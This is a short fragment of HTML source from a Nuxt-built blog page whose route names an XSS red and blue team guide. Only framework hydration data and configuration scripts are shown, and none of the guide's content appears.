data-src="/dEEpEst_23/blog/complete-xss-series-red-and-blue-team-guide/_payload.json?31d7e8d6-9af3-4906-9032-f5730e2702a0">[{"state":1,"once":7,"_errors":8,"serverRendered":5,"path":11,"prerenderedAt":12},["Reactive",2],{"$scolor-mode":3},{"preference":4,"value":4,"unknown":5,"forced":6},"system",true,false,["Set"],["ShallowReactive",9],{"$N-i_jxQxhJ":10},null,"/blog/complete-xss-series-red-and-blue-team-guide",1745678672966]</script>
<script>window.__NUXT__={};window.__NUXT__.config={public:{content:{wsUrl:""},mdc:{components:{prose:true,map:{}},headings:{anchorLinks:{h1:false,h2:true,h3:true,h4:true,h5:false,h6:false}}},"nuxt-scripts":{version:"",defaultScriptOptions:{trigger:"onNuxtReady"}}},app:{baseURL:"/dEEpEst_23/",buildId:"31d7e8d6-9af3-4906-9032-f5730e2702a0",buildAssetsDir:"/_nuxt/",cdnURL:""}}</script></body></html>